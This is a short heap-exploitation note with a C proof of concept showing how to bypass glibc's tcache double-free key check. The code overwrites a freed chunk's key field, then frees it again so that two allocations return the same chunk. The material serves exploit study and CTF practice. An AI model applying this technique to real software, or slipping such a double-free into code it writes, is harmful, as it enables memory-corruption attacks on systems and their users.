<details>
<summary><strong>Description</strong></summary>
<p>

bypass tcache double free's key check...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *duplicate_chunk;

    chunk0 = malloc(0x18); // request size need to in tcache range

    free(chunk0);
    // [tcache 0x20]: chunk0

    printf("tcache key: 0x%lx\n", chunk0[1]);

    // VULNERABILITY
    chunk0[1] = 0x4141414141414141; // modify to any value different with tcache key
    free(chunk0);
    // VULNERABILITY
    // [tcache 0x20]: chunk0 -> chunk0

    chunk1 = malloc(0x18);
    duplicate_chunk = malloc(0x18);
    printf("chunk1: %p\n", chunk1);
    printf("duplicate chunk: %p\n", duplicate_chunk);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/tcache/tcache_double_pass/readme.md
- https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation#double-free-table-of-content

</p>
</details>